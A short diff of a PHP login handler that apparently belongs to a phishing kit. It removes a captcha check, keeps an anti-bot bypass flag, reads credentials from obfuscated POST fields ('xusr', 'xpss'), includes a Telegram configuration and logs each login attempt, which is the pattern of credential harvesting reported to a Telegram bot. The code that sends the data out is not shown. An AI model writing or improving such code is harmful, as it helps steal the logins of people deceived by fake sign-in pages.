@@ -1,9 +1,8 @@
 <?php
 session_start();
 
-// Include Telegram configuration and captcha
+// Include Telegram configuration
 include './config/telegram.php';
-include './captcha.php';
 
 // For local testing - bypass anti-bot protection
 $bypass_antibot = true;
@@ -24,15 +23,6 @@ if (!$bypass_antibot) {
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $username = $_POST['xusr'] ?? '';
     $password = $_POST['xpss'] ?? '';
-    $captcha_answer = $_POST['captcha'] ?? '';
-    
-    // Verify captcha
-    if (!verifyCaptcha($captcha_answer)) {
-        // Captcha failed - redirect back to login with error
-        $_SESSION['captcha_error'] = true;
-        header("Location: ./views/loginz.php");
-        exit;
-    }
     
     // Log the login attempt
     $log_data = [
